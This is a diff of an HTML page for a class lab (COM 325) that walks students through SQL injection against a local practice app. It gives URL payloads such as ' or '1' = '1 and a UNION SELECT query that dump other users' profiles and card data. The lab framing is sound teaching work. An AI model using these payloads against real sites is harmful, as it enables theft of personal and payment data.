@@ -10,18 +10,38 @@
   <body class="markdown-body">
       <div style="text-align: left">
         <h1>⭐ Lab 1 ⭐: Stealing people's data</h1>
-        <p></p>
+        <blockquote>
+            You are logged in as <b>Phong</b>. Suddenly, the SQL Injection vulnarability mentioned in class earlier came to your mind . . . You are tempted to do some really bad 😈
+        </blockquote>
       </div>
       <div style="margin-left: 2%">
-        <h2>🎉 Hi <b><code>COM 325</code></b>!</h2>
-        <p>> Welcome to my lab session 🥳️. My presentation will bring us back to a topic that we already seen in our first class : 💉 <b>SQL Injection</b></p>
-        <p>But today, I would try to bring it to another level. We will be in the role of 😈<b>A Bad Guy</b>😈 trying to do some really bad things.</p>
-      </div>
-        <div style="align-items: center; justify-content: center; margin-top: 4%; text-align: center">
-          <p>👉<b>Click Button to lauch the lab environment: </b></p>
-          <a href="https://gitpod.io/#https://github.com/meobilivang/COM325-SQL-Injection-App/" target="_blank"><img src="https://gitpod.io/button/open-in-gitpod.svg"/></a>
+        <h2>👨 Users' sensitive data</h2>
+        <p><b>Current URL</b>: <code>http://127.0.0.1/users/4395</code></p>
+        <p>> Now, you are in the website. After navigating to <b>My Profile</b>, you see that your personal data is displayed here. So how can we expose others' data here?</p>
+        <div style="margin-left: 3%">
+            <p>Try to modify <code>4395</code> to <code>' or '1' = '1</code></p>
+            <p><b>"Bad" URL</b>: <code>http://127.0.0.1/users/' or '1' = '1</code></p>
         </div>
-
+        <div style="margin-top: 3%; margin-bot: 2%; text-align: center">
+            <p>Take a look at the result. 🎉 <b>Congratulations, you just successfully launch a SQL injection attack</b></p>
+        </div>
+        <h2>💳 Cards data</h2>
+            <p><b>Current URL</b>: <code>http://127.0.0.1/users/cards/4395</code></p>
+            <p>> You are done with stealing's people personal info. Let's have a check on <b>My Cards</b>. Your cards is displayed here. It is very likely that this page can also be attacked</p>
+            <div style="margin-left: 3%">
+                <p>Try to modify <code>4395</code> to <code>' or '1' = '1</code></p>
+                <p><b>"Bad" URL</b>: <code>http://127.0.0.1/users/cards/' or '1' = '1</code></p>
+            </div>
+            <p style="margin-top: 2%">> Wait a minute! You realized that the <b>Camel ID</b> is being used to map an user to card(s). An idea pops up 💡</p>
+            <div style="margin-left: 3%">
+                <p>Try to modify <code>4395</code> to <code>' AND '1' = '1' UNION SELECT name, camel_id FROM users --</code></p>
+                <p><b>"Bad" URL</b>: <code>http://127.0.0.1/users/cards/' AND '1' = '1' UNION SELECT name, camel_id FROM users --</code></p>
+                <p style="margin-top: 2%; text-align: center">Wow! <b>You can even steal user's data from the card page. 😧</b></p>
+            </div>
+        <div style="margin-top: 3%; margin-bot: 2%; text-align: center">
+            <p>🎉 <b>You got tons of sensitive data in your hand now. What are you going to doing with these 😈?</b></p>
+        </div>
+    </div>
         <div style="display: flex; align-items: center; justify-content: space-around; margin-top: 4%; text-align: center">
           <a href="lab-intro.html">👈 Previous 👈</a>
           <a href="lab2.html">👉 Next 👉</a>
